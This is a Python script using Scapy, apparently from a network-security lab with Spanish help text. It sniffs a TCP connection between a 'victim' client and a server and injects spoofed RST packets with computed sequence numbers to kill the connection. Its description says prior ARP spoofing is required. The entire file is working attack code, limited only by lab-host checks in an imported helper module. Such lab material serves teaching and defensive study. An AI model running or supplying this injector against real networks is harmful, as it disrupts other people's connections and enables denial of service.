#!/usr/bin/env python3
from __future__ import annotations

import argparse

from scapy.all import IP, TCP, send, sniff

from common import iface, print_banner, require_lab_ip, require_root_hint, setup_scapy


def main():
    parser = argparse.ArgumentParser(
        description=(
            "TCP RST injection controlado para laboratorio. "
            "Requiere observar la conexión, por ejemplo mediante ARP spoofing previo."
        )
    )
    parser.add_argument("--victim", default="victim-client")
    parser.add_argument("--server", default="web-server")
    parser.add_argument("--port", type=int, default=8080)
    parser.add_argument("--iface", default=iface())
    args = parser.parse_args()

    require_root_hint()
    setup_scapy()

    victim_ip = require_lab_ip(args.victim)
    server_ip = require_lab_ip(args.server)

    print_banner("TCP RST injection lab")
    print(f"victim={victim_ip}")
    print(f"server={server_ip}:{args.port}")
    print("[*] Esperando paquetes TCP de la conexión. Ctrl+C para salir.")

    def handle(pkt):
        if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
            return

        ip = pkt[IP]
        tcp = pkt[TCP]

        flow_matches = (
            (ip.src == victim_ip and ip.dst == server_ip and tcp.dport == args.port)
            or (ip.src == server_ip and ip.dst == victim_ip and tcp.sport == args.port)
        )

        if not flow_matches:
            return

        if tcp.flags & 0x04:
            return

        payload_len = len(bytes(tcp.payload))
        seq = tcp.seq + payload_len
        if tcp.flags & 0x02:
            seq += 1
        if tcp.flags & 0x01:
            seq += 1

        rst = IP(src=ip.src, dst=ip.dst) / TCP(
            sport=tcp.sport,
            dport=tcp.dport,
            flags="R",
            seq=seq,
        )

        print(f"[RST] {ip.src}:{tcp.sport} -> {ip.dst}:{tcp.dport} seq={seq}")
        send(rst, verbose=False)

    sniff(
        iface=args.iface,
        filter=f"tcp port {args.port}",
        prn=handle,
        store=False,
    )


if __name__ == "__main__":
    main()
